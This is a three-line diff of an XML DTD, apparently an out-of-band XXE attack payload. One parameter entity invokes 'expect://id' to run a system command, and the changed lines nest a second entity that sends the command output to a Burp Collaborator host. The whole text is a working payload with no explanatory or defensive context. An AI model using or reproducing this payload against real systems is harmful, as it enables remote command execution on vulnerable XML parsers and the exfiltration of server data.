@@ -1,2 +1,3 @@
 <!ENTITY % ccc SYSTEM "expect://id">
-<!ENTITY % bbb SYSTEM "https://bbb.v2y42yl2wlqib3p8wx5a2ydcj3pydn.burpcollaborator.net?b=%ccc;">
+<!ENTITY % bbb "<!ENTITY % ddd SYSTEM 'https://bbb.v2y42yl2wlqib3p8wx5a2ydcj3pydn.burpcollaborator.net?b=%ccc;'>">
+%ddd;
